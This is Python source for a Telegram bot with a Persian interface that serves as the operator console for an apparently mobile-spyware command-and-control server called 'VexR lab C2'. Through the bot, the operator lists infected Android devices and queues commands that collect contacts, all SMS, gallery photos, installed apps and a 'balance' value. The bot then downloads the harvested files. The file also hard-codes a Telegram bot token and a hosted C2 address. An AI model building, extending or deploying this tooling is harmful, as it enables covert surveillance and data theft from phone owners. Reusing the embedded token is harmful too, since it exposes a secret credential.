"""VexR lab C2 — Telegram operator bot (aiogram 3).

A thin, stateless client over the C2 operator API. It never touches the
database, the implant protocol, or the artifact files: every screen is built
from one fresh HTTP call.

Setup:
    cp .env.example .env        # bot token + your numeric Telegram user id
    ../venv/bin/python bot.py
"""

from __future__ import annotations

import asyncio
import html
import logging
import os
import re
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Awaitable, Callable
from urllib.parse import quote, unquote

import httpx
from aiogram import BaseMiddleware, Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.client.session.aiohttp import AiohttpSession
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest
from aiogram.filters import Command, CommandObject, CommandStart
from aiogram.types import (
    BufferedInputFile,
    CallbackQuery,
    ErrorEvent,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
)
from dotenv import load_dotenv

BASE_DIR = Path(__file__).resolve().parent
load_dotenv(BASE_DIR / ".env")

log = logging.getLogger("vexr.bot")
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
logging.getLogger("httpx").setLevel(logging.WARNING)

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------

BOT_TOKEN = (
    os.environ.get("TELEGRAM_BOT_TOKEN", "").strip()
    or "8822853055:AAFOBse3383qi31m7fPiNmhczzr8JAuclak"
)
C2_URL = os.environ.get(
    "VEXR_C2_URL", "https://vexr-lab-c2-academic-production.up.railway.app"
).rstrip("/")

# Optional. Needed where api.telegram.org is blocked, e.g. socks5://127.0.0.1:10808
TELEGRAM_PROXY = os.environ.get("TELEGRAM_PROXY", "").strip()


def _parse_ids(raw: str) -> set[int]:
    ids: set[int] = set()
    for part in re.split(r"[,\s]+", raw.strip()):
        if not part:
            continue
        try:
            ids.add(int(part))
        except ValueError:
            log.warning("ignoring non-numeric id in TELEGRAM_ALLOWED_IDS: %r", part)
    return ids


ALLOWED_IDS = _parse_ids(os.environ.get("TELEGRAM_ALLOWED_IDS", ""))

COMMANDS: dict[str, str] = {
    "contacts": "📇 مخاطبین",
    "allsms": "💬 پیامک",
    "gallery": "🖼 گالری",
    "applist": "📦 اپلیکیشن‌ها",
    "balance": "💰 موجودی",
    "discovery": "🔎 همه‌چیز",
}

STATUS = {
    "pending": "در صف",
    "sent": "ارسال‌شده",
    "completed": "تکمیل",
    "expired": "منقضی",
}

BTN_STATS = "📊 وضعیت"
BTN_DEVICES = "📱 دستگاه‌ها"
BTN_FILES = "📁 فایل‌ها"


# ---------------------------------------------------------------------------
# Server client — the only place that knows the URL and HTTP
# ---------------------------------------------------------------------------


class C2Error(RuntimeError):
    """The server could not answer, or answered with an error."""


class C2Client:
    """One shared connection pool for the whole bot lifetime."""

    def __init__(self, base_url: str) -> None:
        self._http = httpx.AsyncClient(
            base_url=base_url,
            timeout=httpx.Timeout(15.0, connect=5.0),
            headers={"User-Agent": "vexr-lab-bot/1.0"},
        )

    async def close(self) -> None:
        await self._http.aclose()

    async def _json(self, method: str, path: str, **kwargs: Any) -> Any:
        try:
            response = await self._http.request(method, path, **kwargs)
        except httpx.HTTPError as exc:
            raise C2Error(
                f"ارتباط با سرور برقرار نشد ({exc.__class__.__name__})."
            ) from exc
        if response.status_code == 404:
            raise C2Error("پیدا نشد — دستگاه یا فایل وجود ندارد.")
        if response.status_code != 200:
            raise C2Error(
                f"سرور کد {response.status_code} داد: {response.text[:160]}"
            )
        return response.json()

    async def stats(self) -> dict[str, Any]:
        return await self._json("GET", "/api/stats")

    async def devices(self) -> list[dict[str, Any]]:
        return (await self._json("GET", "/api/devices"))["devices"]

    async def device(self, key: str) -> dict[str, Any]:
        return await self._json("GET", f"/api/devices/{quote(key, safe='')}")

    async def send_command(self, key: str, command: str) -> dict[str, Any]:
        return await self._json(
            "POST", "/api/command", json={"device_key": key, "command": command}
        )

    async def artifacts(self, limit: int = 12) -> list[dict[str, Any]]:
        data = await self._json("GET", "/api/artifacts", params={"limit": limit})
        return data["artifacts"]

    async def download(self, artifact_id: int) -> tuple[bytes, str, str]:
        try:
            response = await self._http.get(f"/api/artifacts/{artifact_id}/download")
        except httpx.HTTPError as exc:
            raise C2Error(
                f"ارتباط با سرور برقرار نشد ({exc.__class__.__name__})."
            ) from exc
        if response.status_code == 404:
            raise C2Error("فایل پیدا نشد.")
        if response.status_code != 200:
            raise C2Error(
                f"سرور کد {response.status_code} داد: {response.text[:160]}"
            )
        return (
            response.content,
            _filename_from(response, f"artifact_{artifact_id}.bin"),
            response.headers.get("content-type", ""),
        )


_FILENAME_RE = re.compile(
    r"filename\*?=(?:UTF-8'')?\"?([^\";]+)\"?", re.IGNORECASE
)


def _filename_from(response: httpx.Response, fallback: str) -> str:
    """Pull the filename out of Content-Disposition; fall back to a stable name."""
    header = response.headers.get("content-disposition", "")
    match = _FILENAME_RE.search(header)
    if not match:
        return fallback
    return unquote(match.group(1).strip()) or fallback


# ---------------------------------------------------------------------------
# Formatting — pure functions, no network
# ---------------------------------------------------------------------------


def esc(value: Any) -> str:
    if value is None or value == "":
        return "—"
    return html.escape(str(value))


def ago(value: str | None) -> str:
    if not value:
        return "—"
    try:
        seen = datetime.fromisoformat(value)
    except ValueError:
        return "—"
    if seen.tzinfo is None:
        seen = seen.replace(tzinfo=timezone.utc)
    seconds = (datetime.now(timezone.utc) - seen).total_seconds()
    if seconds < 60:
        return "همین حالا"
    if seconds < 3600:
        return f"{int(seconds // 60)} دقیقه پیش"
    if seconds < 86400:
        return f"{int(seconds // 3600)} ساعت پیش"
    return f"{int(seconds // 86400)} روز پیش"


def size(value: int | float | None) -> str:
    n = int(value or 0)
    if n < 1024:
        return f"{n} B"
    if n < 1024 * 1024:
        return f"{n / 1024:.1f} KB"
    return f"{n / (1024 * 1024):.1f} MB"


def stats_text(stats: dict[str, Any]) -> str:
    return (
        "📊 <b>وضعیت سرور</b>\n\n"
        f"🟢 آنلاین: {stats.get('online', 0)} از {stats.get('devices', 0)}\n"
        f"📡 بیکن‌ها: {stats.get('beacons', 0)}\n"
        f"📁 فایل‌ها: {stats.get('artifacts', 0)}\n"
        f"⏳ در انتظار: {stats.get('commands_pending', 0)}\n"
        f"✅ تکمیل‌شده: {stats.get('commands_completed', 0)}"
    )


def devices_view(
    devices: list[dict[str, Any]],
) -> tuple[str, InlineKeyboardMarkup | None]:
    if not devices:
        return (
            "📱 <b>هیچ دستگاهی وصل نیست.</b>\n\n"
            "اپلیکیشن lab را روی گوشی باز کن؛ هر ۳۰ ثانیه بیکن می‌زند.",
            None,
        )

    blocks: list[str] = []
    rows: list[list[InlineKeyboardButton]] = []
    for device in devices:
        online = bool(device.get("online"))
        dot = "🟢" if online else "🔴"
        state = "آنلاین" if online else "آفلاین"
        blocks.append(
            f"{dot} <b>{esc(device.get('model') or 'ناشناس')}</b> · "
            f"{esc(device.get('manufacturer'))}\n"
            f"{state} · آخرین ارتباط {ago(device.get('last_seen'))}"
        )
        label = (device.get("model") or "ناشناس")[:40]
        rows.append(
            [
                InlineKeyboardButton(
                    text=f"{dot} {label}",
                    callback_data=f"dev:{device['device_key']}",
                )
            ]
        )

    text = f"📱 <b>دستگاه‌ها</b> ({len(devices)})\n\n" + "\n\n".join(blocks)
    return text, InlineKeyboardMarkup(inline_keyboard=rows)


def device_card(payload: dict[str, Any]) -> str:
    device = payload.get("device") or {}
    online = bool(device.get("online"))
    lines = [
        f"📱 <b>{esc(device.get('model') or 'ناشناس')}</b>",
        f"{esc(device.get('manufacturer'))} · Android {esc(device.get('android_ver'))}",
        "",
        f"{'🟢' if online else '🔴'} {'آنلاین' if online else 'آفلاین'}"
        f" · آخرین ارتباط {ago(device.get('last_seen'))}",
        f"📡 بیکن {device.get('beacons', 0)}"
        f" · 📁 فایل {device.get('artifacts', 0)}"
        f" · ⏳ در انتظار {device.get('commands_pending', 0)}",
    ]

    beacons = payload.get("beacons") or []
    if beacons:
        last = beacons[0]
        lines.append(
            f"آخرین بیکن: {esc(last.get('action'))} · {esc(last.get('transport'))}"
        )

    lines.append("")
    commands = payload.get("commands") or []
    if commands:
        lines.append("<b>آخرین دستورها</b>")
        for command in commands[:5]:
            status = STATUS.get(command.get("status"), esc(command.get("status")))
            lines.append(
                f"• {esc(command.get('command'))} — {status}"
                f" · {ago(command.get('created_at'))}"
            )
    else:
        lines.append("دستوری ثبت نشده.")
    return "\n".join(lines)


def files_view(
    items: list[dict[str, Any]],
) -> tuple[str, InlineKeyboardMarkup | None]:
    if not items:
        return (
            "📁 <b>هنوز فایلی نیامده.</b>\n\n"
            "نتیجهٔ هر دستور به‌صورت فایل برمی‌گردد و اینجا ظاهر می‌شود.",
            None,
        )

    blocks: list[str] = []
    rows: list[list[InlineKeyboardButton]] = []
    for item in items:
        name = item.get("filename") or f"artifact_{item.get('id')}"
        blocks.append(
            f"• {esc(name)} · {size(item.get('size_bytes'))}"
            f" · {ago(item.get('received_at'))}"
        )
        rows.append(
            [
                InlineKeyboardButton(
                    text=f"📄 {name[:40]}",
                    callback_data=f"file:{item.get('id')}",
                )
            ]
        )

    text = f"📁 <b>آخرین فایل‌ها</b> ({len(items)})\n\n" + "\n".join(blocks)
    return text, InlineKeyboardMarkup(inline_keyboard=rows)


def command_keyboard(key: str) -> InlineKeyboardMarkup:
    items = list(COMMANDS.items())
    rows: list[list[InlineKeyboardButton]] = []
    for index in range(0, len(items), 2):
        rows.append(
            [
                InlineKeyboardButton(
                    text=label, callback_data=f"cmd:{key}:{name}"
                )
                for name, label in items[index : index + 2]
            ]
        )
    rows.append([InlineKeyboardButton(text="⬅️ بازگشت", callback_data="devs")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


def is_photo(name: str, content_type: str, size_bytes: int) -> bool:
    if size_bytes > 10 * 1024 * 1024:  # Telegram's photo limit
        return False
    if content_type.startswith("image/"):
        return True
    return name.lower().endswith((".jpg", ".jpeg", ".png", ".webp"))


START_TEXT = (
    "🤖 <b>VexR Lab C2</b>\n\n"
    "از دکمه‌های پایین استفاده کن، یا:\n\n"
    "/stats — وضعیت سرور\n"
    "/devices — لیست دستگاه‌ها\n"
    "/files — آخرین فایل‌ها\n\n"
    "دستور مستقیم:\n"
    "/cmd &lt;device_key&gt; &lt;command&gt;\n"
    "/get &lt;artifact_id&gt;"
)

MAIN_KEYBOARD = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text=BTN_STATS), KeyboardButton(text=BTN_DEVICES)],
        [KeyboardButton(text=BTN_FILES)],
    ],
    resize_keyboard=True,
)


# ---------------------------------------------------------------------------
# Dispatcher, allowlist, error handling
# ---------------------------------------------------------------------------

dp = Dispatcher()


class AllowlistMiddleware(BaseMiddleware):
    """Answer only the configured Telegram user ids; ignore everyone else."""

    async def __call__(
        self,
        handler: Callable[[Message | CallbackQuery, dict[str, Any]], Awaitable[Any]],
        event: Message | CallbackQuery,
        data: dict[str, Any],
    ) -> Any:
        user = event.from_user
        if user is not None and user.id in ALLOWED_IDS:
            return await handler(event, data)
        log.warning(
            "blocked user id=%s username=%s",
            getattr(user, "id", "?"),
            getattr(user, "username", "?"),
        )
        return None


dp.message.outer_middleware(AllowlistMiddleware())
dp.callback_query.outer_middleware(AllowlistMiddleware())


@dp.errors()
async def on_error(event: ErrorEvent) -> bool:
    error = event.exception
    log.exception("handler failed", exc_info=error)

    if event.update.callback_query is not None:
        try:
            await event.update.callback_query.answer()
        except Exception:  # noqa: BLE001 - best effort
            pass

    message = event.update.message
    if message is None and event.update.callback_query is not None:
        message = event.update.callback_query.message
    if message is not None:
        text = (
            str(error)
            if isinstance(error, C2Error)
            else "خطای غیرمنتظره رخ داد. لاگ ربات را ببین."
        )
        try:
            await message.answer(f"⚠️ {text}")
        except Exception:  # noqa: BLE001 - never fail inside the error handler
            log.exception("could not deliver the error message")
    return True


async def safe_edit(
    message: Message, text: str, markup: InlineKeyboardMarkup | None = None
) -> None:
    try:
        await message.edit_text(text, reply_markup=markup)
    except TelegramBadRequest as exc:
        if "not modified" not in str(exc):
            raise


async def send_artifact(message: Message, c2: C2Client, artifact_id: int) -> None:
    data, name, content_type = await c2.download(artifact_id)
    upload = BufferedInputFile(data, filename=name)
    caption = f"{esc(name)} · {size(len(data))}"
    if is_photo(name, content_type, len(data)):
        await message.answer_photo(upload, caption=caption)
    else:
        await message.answer_document(upload, caption=caption)


# ---------------------------------------------------------------------------
# Handlers
# ---------------------------------------------------------------------------


@dp.message(CommandStart())
async def on_start(message: Message) -> None:
    await message.answer(START_TEXT, reply_markup=MAIN_KEYBOARD)


@dp.message(Command("stats"))
@dp.message(F.text == BTN_STATS)
async def on_stats(message: Message, c2: C2Client) -> None:
    await message.answer(stats_text(await c2.stats()))


@dp.message(Command("devices"))
@dp.message(F.text == BTN_DEVICES)
async def on_devices(message: Message, c2: C2Client) -> None:
    text, markup = devices_view(await c2.devices())
    await message.answer(text, reply_markup=markup)


@dp.message(Command("device"))
async def on_device_direct(
    message: Message, command: CommandObject, c2: C2Client
) -> None:
    key = (command.args or "").strip()
    if not key:
        await message.answer("استفاده: <code>/device &lt;device_key&gt;</code>")
        return
    await message.answer(
        device_card(await c2.device(key)), reply_markup=command_keyboard(key)
    )


@dp.callback_query(F.data == "devs")
async def on_back(callback: CallbackQuery, c2: C2Client) -> None:
    text, markup = devices_view(await c2.devices())
    if callback.message is not None:
        await safe_edit(callback.message, text, markup)
    await callback.answer()


@dp.callback_query(F.data.startswith("dev:"))
async def on_device(callback: CallbackQuery, c2: C2Client) -> None:
    key = (callback.data or "").split(":", 1)[1]
    if callback.message is not None:
        await safe_edit(
            callback.message,
            device_card(await c2.device(key)),
            command_keyboard(key),
        )
    await callback.answer()


@dp.callback_query(F.data.startswith("cmd:"))
async def on_command(callback: CallbackQuery, c2: C2Client) -> None:
    _, key, command = (callback.data or "").split(":", 2)
    if command not in COMMANDS:
        await callback.answer("دستور ناشناس", show_alert=True)
        return
    result = await c2.send_command(key, command)
    await callback.answer("ثبت شد ✅")
    if callback.message is not None:
        await callback.message.answer(
            f"✅ <b>{esc(command)}</b> برای <code>{esc(key)}</code>"
            f" در صف گذاشته شد (id {result.get('id')}).\n"
            "با بیکن بعدی به گوشی می‌رسد؛ نتیجه در /files ظاهر می‌شود."
        )


@dp.message(Command("cmd"))
async def on_cmd_direct(
    message: Message, command: CommandObject, c2: C2Client
) -> None:
    parts = (command.args or "").split()
    allowed = "، ".join(f"<code>{name}</code>" for name in COMMANDS)
    if len(parts) != 2:
        await message.answer(
            "استفاده: <code>/cmd &lt;device_key&gt; &lt;command&gt;</code>\n\n"
            f"دستورهای مجاز: {allowed}"
        )
        return
    key, name = parts
    if name not in COMMANDS:
        await message.answer(f"دستور ناشناس. مجازها: {allowed}")
        return
    result = await c2.send_command(key, name)
    await message.answer(
        f"✅ <b>{esc(name)}</b> برای <code>{esc(key)}</code>"
        f" در صف گذاشته شد (id {result.get('id')})."
    )


@dp.message(Command("files"))
@dp.message(F.text == BTN_FILES)
async def on_files(message: Message, c2: C2Client) -> None:
    text, markup = files_view(await c2.artifacts())
    await message.answer(text, reply_markup=markup)


@dp.callback_query(F.data.startswith("file:"))
async def on_file(callback: CallbackQuery, c2: C2Client) -> None:
    artifact_id = int((callback.data or "").split(":", 1)[1])
    await callback.answer("در حال دانلود…")
    if callback.message is not None:
        await send_artifact(callback.message, c2, artifact_id)


@dp.message(Command("get"))
async def on_get(message: Message, command: CommandObject, c2: C2Client) -> None:
    raw = (command.args or "").strip()
    if not raw.isdigit():
        await message.answer("استفاده: <code>/get &lt;artifact_id&gt;</code>")
        return
    await send_artifact(message, c2, int(raw))


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------


async def main() -> None:
    if not BOT_TOKEN:
        raise SystemExit(
            "TELEGRAM_BOT_TOKEN تنظیم نشده — .env را از .env.example بساز."
        )
    if not ALLOWED_IDS:
        raise SystemExit(
            "TELEGRAM_ALLOWED_IDS خالی است. آیدی عددی خودت را از @userinfobot "
            "بگیر و در .env بگذار؛ وگرنه ربات به هیچ‌کس جواب نمی‌دهد."
        )

    c2 = C2Client(C2_URL)
    session = AiohttpSession(proxy=TELEGRAM_PROXY or None, timeout=20)
    bot = Bot(
        BOT_TOKEN,
        session=session,
        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
    )
    dp["c2"] = c2

    try:
        me = await bot.get_me()
    except Exception as exc:  # noqa: BLE001 - startup check, message matters more
        await c2.close()
        await bot.session.close()
        raise SystemExit(
            f"اتصال به تلگرام برقرار نشد ({exc.__class__.__name__}: {exc}).\n"
            "اگر api.telegram.org در دسترس نیست، TELEGRAM_PROXY را در .env بگذار."
        ) from exc

    log.info(
        "connected as @%s · c2=%s · allowed=%d",
        me.username,
        C2_URL,
        len(ALLOWED_IDS),
    )
    try:
        await bot.delete_webhook(drop_pending_updates=True)
        await dp.start_polling(bot)
    finally:
        await c2.close()
        log.info("stopped")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
